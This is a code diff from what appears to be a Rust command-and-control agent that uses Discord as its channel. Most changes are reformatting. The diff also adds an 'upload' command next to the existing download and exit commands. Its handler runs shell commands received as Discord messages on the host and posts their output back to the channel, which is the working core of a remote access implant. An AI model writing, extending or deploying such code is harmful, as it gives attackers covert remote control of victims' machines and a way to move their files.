@@ -1,11 +1,14 @@
 use crate::{
-    commands::shell::{download, exit},
+    commands::shell::{ download, exit, upload },
     discord_utils::bot_functions::{
-        send_channel_message, send_code_message, send_edit_response, send_ephemeral_response,
+        send_channel_message,
+        send_code_message,
+        send_edit_response,
+        send_ephemeral_response,
     },
     discord_utils::channels::create_text_channel,
     errors::DiscordC2Error,
-    os::process_handler::{ProcessHandler, ShellType},
+    os::process_handler::{ ProcessHandler, ShellType },
     utils::agent::get_or_create_agent,
 };
 
@@ -13,9 +16,11 @@ use serenity::{
     builder::CreateApplicationCommand,
     client::Context,
     model::application::{
-        command::{Command, CommandOptionType},
+        command::{ Command, CommandOptionType },
         interaction::application_command::{
-            ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
+            ApplicationCommandInteraction,
+            CommandDataOption,
+            CommandDataOptionValue,
         },
     },
     model::prelude::Message,
@@ -25,7 +30,7 @@ use anyhow::Error;
 use chrono::Utc;
 use lazy_static::lazy_static;
 use tokio::sync::Mutex;
-use tracing::{error, info as informational, warn};
+use tracing::{ error, info as informational, warn };
 
 lazy_static! {
     pub static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
@@ -131,7 +136,7 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
 /// has been initialized.
 pub async fn run(
     ctx: &Context,
-    options: &[CommandDataOption],
+    options: &[CommandDataOption]
 ) -> Result<(String, Option<ShellType>), DiscordC2Error> {
     let mut agent = get_or_create_agent(ctx).await;
 
@@ -140,10 +145,7 @@ pub async fn run(
     if shell_type.is_some() {
         match ProcessHandler::is_instantiated().await {
             true => {
-                warn!(
-                    "The shell {:?} was already instantiated, what is bro doing?",
-                    shell_type
-                );
+                warn!("The shell {:?} was already instantiated, what is bro doing?", shell_type);
                 return Ok((
                     format!(
                         "***Command session has already been initialized in channel <#{}>!***",
@@ -169,12 +171,12 @@ pub async fn run(
     let option = options
         .get(0)
         .ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?
-        .resolved
-        .as_ref()
+        .resolved.as_ref()
         .ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?;
 
-    let ctx1 = ctx.to_owned();
-    let ctx2 = ctx.to_owned();
+    let ctx1 = ctx.clone();
+    let ctx2 = ctx.clone();
+    let ctx3 = ctx.clone();
 
     tokio::spawn(async {
         if let Err(why) = Command::create_global_application_command(ctx1, exit::register).await {
@@ -186,13 +188,21 @@ pub async fn run(
     });
 
     tokio::spawn(async {
-        if let Err(why) = Command::create_global_application_command(ctx2, download::register).await
+        if let Err(why) = Command::create_global_application_command(ctx2,download::register).await
         {
             error!("Failed to register the download command: {:?}", why);
             return;
         }
 
         informational!("Successfully registered download command.");
+    });
+
+    tokio::spawn(async {
+        if let Err(why) = Command::create_global_application_command(ctx3, upload::register).await {
+            error!("Failed to register the upload command: {:?}", why);
+            return;
+        }
+        informational!("Successfully registered the upload-file command.");
     });
 
     // Create a channel for the remote session, and set the name/topic appropriately
@@ -209,10 +219,7 @@ pub async fn run(
         }
     }); // Update the agent's session channel attribute (this also updates the JSON configuration).
 
-    let string = format!(
-        "Successfully created command session channel at <#{}>",
-        session_channel
-    );
+    let string = format!("Successfully created command session channel at <#{}>", session_channel);
 
     if let CommandDataOptionValue::String(shell_type) = option {
         let (content, shell) = match shell_type.as_str() {
@@ -280,7 +287,7 @@ pub async fn run(
 /// followed by an optional `ShellType` object.
 pub async fn session_handler(
     ctx: &Context,
-    command: &ApplicationCommandInteraction,
+    command: &ApplicationCommandInteraction
 ) -> Result<(), DiscordC2Error> {
     let response = send_ephemeral_response(ctx, command, "Creating session....", None).await?;
     let (content, shell) = run(ctx, &command.data.options).await?;
@@ -307,9 +314,8 @@ pub async fn command_handler(ctx: &Context, message: &Message) -> Result<(), Err
                 send_channel_message(
                     ctx,
                     message.channel_id,
-                    "Stale/expired session. Closing....",
-                )
-                .await?;
+                    "Stale/expired session. Closing...."
+                ).await?;
                 exit::run(ctx).await?;
             }
             return Ok(());
@@ -326,15 +332,19 @@ pub async fn command_handler(ctx: &Context, message: &Message) -> Result<(), Err
             send_channel_message(
                 ctx,
                 message.channel_id,
-                "Successfully exited session. Use /exit to close the channel.",
-            )
-            .await?;
+                "Successfully exited session. Use /exit to close the channel."
+            ).await?;
         } else {
             let output = shell.run_command(&message.content).await?;
             let language_format = shell_type.as_str().replace(".exe", "");
 
-            if let Err(why) =
-                send_code_message(ctx, message.channel_id, &output, &language_format).await
+            if
+                let Err(why) = send_code_message(
+                    ctx,
+                    message.channel_id,
+                    &output,
+                    &language_format
+                ).await
             {
                 println!("{}", why);
             }
